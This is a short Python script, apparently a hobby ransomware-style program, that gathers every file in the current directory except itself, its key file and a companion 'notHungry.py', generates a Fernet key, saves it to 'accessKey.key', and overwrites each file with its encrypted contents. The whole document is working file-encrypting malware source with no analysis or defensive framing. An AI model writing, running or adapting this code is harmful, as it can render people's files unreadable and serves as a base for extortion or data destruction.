
import os
from cryptography.fernet import Fernet

files = []


for file in os.listdir():
    #ignored files
    if file == "hungryGuy.py" or file == "accessKey.key" or file == "notHungry.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

# generate key 
key = Fernet.generate_key()
with open ("accessKey.key", "wb") as accessKey:
    accessKey.write(key)

#encrypt files
for  file in files:
    with open(file, "rb") as theFiles:
        contents = theFiles.read()
    contents_encrypted = Fernet(key).encrypt(contents)

    with open(file, "wb") as theFiles:
        theFiles.write(contents_encrypted)
print("Encryption completed!!")